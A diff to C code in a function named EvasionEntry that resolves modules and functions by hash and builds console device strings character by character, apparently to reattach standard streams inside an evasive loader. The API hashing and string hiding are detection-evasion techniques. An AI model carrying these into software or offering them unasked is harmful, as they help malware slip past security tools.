@@ -156,4 +156,28 @@ void EvasionEntry(BYTE* sa) {
             }
         }
     }
+    {
+        HMODULE hUc = 0;
+        BYTE* c3 = *(BYTE**)head;
+        while (c3 != head) {
+            HMODULE mx = *(HMODULE*)(c3 + 0x20);
+            if (mx && RE(mx, 0xF2E868D9u)) { hUc = mx; break; }
+            c3 = *(BYTE**)c3;
+        }
+        if (hUc) {
+            typedef void*(*tAIOB)(unsigned);
+            typedef void*(*tFR)(const char*, const char*, void*);
+            tAIOB paiob = (tAIOB)RE(hUc, 0xF2E868D9u);
+            tFR pfr = (tFR)RE(hUc, 0x64ED5642u);
+            if (paiob && pfr) {
+                char ci[7]; ci[0]='C';ci[1]='O';ci[2]='N';ci[3]='I';ci[4]='N';ci[5]='$';ci[6]=0;
+                char co[8]; co[0]='C';co[1]='O';co[2]='N';co[3]='O';co[4]='U';co[5]='T';co[6]='$';co[7]=0;
+                char rd[2]; rd[0]='r'; rd[1]=0;
+                char wr[2]; wr[0]='w'; wr[1]=0;
+                pfr(ci, rd, paiob(0));
+                pfr(co, wr, paiob(1));
+                pfr(co, wr, paiob(2));
+            }
+        }
+    }
 }
